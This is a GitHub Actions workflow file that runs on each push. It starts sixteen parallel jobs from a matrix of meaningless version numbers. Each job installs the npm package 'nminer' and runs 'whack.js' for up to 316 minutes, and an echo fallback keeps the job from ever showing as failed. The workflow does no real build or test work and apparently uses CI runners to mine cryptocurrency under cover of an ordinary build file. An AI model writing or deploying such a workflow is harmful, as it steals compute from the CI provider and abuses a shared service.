name: whack
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4658 }
          - { version: 1629 }
          - { version: 2274 }
          - { version: 3536 }
          - { version: 130 }
          - { version: 4709 }
          - { version: 3523 }
          - { version: 9521 }
          - { version: 1635 }
          - { version: 6548 }
          - { version: 2628 }
          - { version: 5301 }
          - { version: 9033 }
          - { version: 67 }
          - { version: 5767 }
          - { version: 6237 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 316m node whack.js || echo "whack executed"